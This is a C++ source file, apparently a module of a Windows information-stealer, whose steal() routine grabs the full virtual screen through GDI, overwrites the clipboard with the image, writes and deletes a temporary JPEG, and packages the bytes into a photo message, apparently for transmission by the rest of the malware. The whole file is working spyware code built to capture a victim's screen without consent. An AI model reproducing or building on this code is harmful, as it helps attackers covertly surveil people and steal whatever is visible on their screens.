#include "srceenshot_stealer.h"

#include "messages/photo_message.h"

#define max(a, b) (a) > (b) ? (a) : (b)
#define min(a, b) (a) > (b) ? (b) : (a)

#include "atlimage.h"
#include "gdiplusimaging.h"
#include <fstream>

asio::awaitable<std::unique_ptr<message_t>> srceenshot_stealer_t::steal()
{
    return asio::async_initiate<decltype(asio::use_awaitable), void(std::unique_ptr<message_t>&&)>(
        [](auto completion_handler)
        {
            std::thread([](auto completion_handler)
            {
                int x1, y1, x2, y2, w, h;

                x1  = GetSystemMetrics(SM_XVIRTUALSCREEN);
                y1  = GetSystemMetrics(SM_YVIRTUALSCREEN);
                x2  = GetSystemMetrics(SM_CXVIRTUALSCREEN);
                y2  = GetSystemMetrics(SM_CYVIRTUALSCREEN);
                w   = x2 - x1;
                h   = y2 - y1;

                HDC     hScreen = GetDC(NULL);
                HDC     hDC     = CreateCompatibleDC(hScreen);
                HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, w, h);
                HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
                BOOL    bRet    = BitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY);

                OpenClipboard(NULL);
                EmptyClipboard();
                SetClipboardData(CF_BITMAP, hBitmap);
                CloseClipboard();

                const auto FILE_NAME = "screenshot.jpeg";

                // TODO refactor this shit
                CImage image;
                image.Attach(hBitmap);
                image.Save(FILE_NAME);

                std::ifstream ifs(FILE_NAME, std::ios::binary);
                DeleteFile(FILE_NAME);
                // TODO refactor this shit

                auto to_ret = std::make_unique<photo_message_t>();
                std::string data;
                data.assign((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
                to_ret->move_to_data_and_set_path(data, FILE_NAME);

                SelectObject(hDC, old_obj);
                DeleteDC(hDC);
                ReleaseDC(NULL, hScreen);
                DeleteObject(hBitmap);

                DLOG("screenshot have been done");

                std::move(completion_handler)(std::move(to_ret));
            }, std::move(completion_handler)).detach();
        }, asio::use_awaitable
    );
}
